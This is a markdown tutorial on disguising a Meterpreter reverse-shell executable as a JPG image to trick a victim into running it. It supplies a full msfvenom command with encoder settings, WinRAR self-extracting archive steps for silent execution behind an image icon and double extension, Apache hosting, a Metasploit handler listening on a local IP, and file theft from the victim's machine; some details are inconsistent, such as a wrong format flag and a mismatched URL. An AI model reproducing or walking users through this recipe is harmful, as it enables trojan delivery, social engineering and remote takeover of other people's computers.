# Exploitation With An Image

We'll make executable look like image file to fool user and run our exploit in background.

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Steps for make exploit in form of Image

### Step 1: Genrating the shellcode with MSFvenomm

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.26 LPORT=443 -e x86/shikata_ga_nai -i 15 -f exe -o hack.exe
```

- `-p`: Payload which needs to be delivered in the exploit. We have used **windows/meterpreter/reverse_tcp** the payload is staged and will connect back to our handler to deliver the complete meterpreter payload.
- `--platform`: Platform for which exploit is developed. We have used **windows** as our platform.
- `-a`: Architecture of exploit is **x86** works with both 32 and 64-bit windows and better than **x64**.
- `LHOST`: Host to which exploit will connect. We are using our local IP here.
- `LPORT`: Port to which exploit will connect. We are using 443 to avoid windows firewall issue.
- `-e`: Encoder of exploit. We see the most success using **x86/shikata_ga_nai** with several iterations.
- `-i`: Iteration of the encoder. No of iteration for encoder **15** works fine
- `-f`: Output format of the exploit. we're using c as our format.
- `-o`: Output path of exploit.

### Step 2: Collecting the necessary files

Download your favourite JPG image from online and save in same directory where you’ve saved your executable payload.
Furthermore, you also need an thumbnail icon for the final payload so that you can build up more trust with the user.
To do that, go to `https://convertico.com/jpg-to-ico/` which generates `.ico`.

### Step 3: Making executable look as Image

Now make a archive of image and executable using winrar. Follow below step to do so.

- Select both image and excubale and select **Add to archive..** option.
- Change **Archiving options** to *Create SFX archive*.
- Click on Advanced Tab.
- In Advanced tab, click on SFX Options.
- Click on **Setup** tab and add below lines under **Run After Extraction** area.

    ```bash
    hack.jpg
    hack.exe
    ```

- Click on **Text and Icon** tab and set icon as a thumbnail under **Load SFX icon from the file** option so that the file looks like a proper image file.
- Click on **Modes** tab and change the **Silent mode** option to `Hide all`.
- Click on **Update** tab and change the **Overwrite mode** option to `Overwrite all files`.
- Rename file hack.jpg so that actual name of executable will be `hack.jpg.exe`.

### Step 4: Serving executable with apache server

We'll use an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple. First, we'll copy executable to `/var/www/html` than we'll start our apache server.

```bash
$ cp hack.jpg.exe /var/www/html/hack.jpg.exe
$ service apache2 start
```

### Step 5: Starting a Meterpreter handler

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service postgresql start
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit -j
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows 7 machine.

### Step 6: Downloading file on a victim's computer

On the target, browse to the URL(`/msf_attack2.exe`) with the IP address of the attacking machine and download the file.

`http://192.168.1.26/hack.jpg.exe`

Then, simply save it and run it and we have a reverse connection to the Windows 7 machine from the Kali Linux command line.

### Step 7: Privilege Escalation

We have a Meterpreter session established back on our handler. So let’s see what we can do with full control.

```bash
msterpreter> help
```

Now we'll download the video file from the videos folder as proof.

```bash
msterpreter> cd ..
msterpreter> cd Videos
msterpreter> download ./Wildlife.wmv
```

The file will be downloaded to the home folder we can further play it.

### References

- `https://www.yeahhub.com/windows-10-exploitation-image-metasploit-framework-2018/`
- `https://www.youtube.com/watch?v=STZ3aZDR2uc`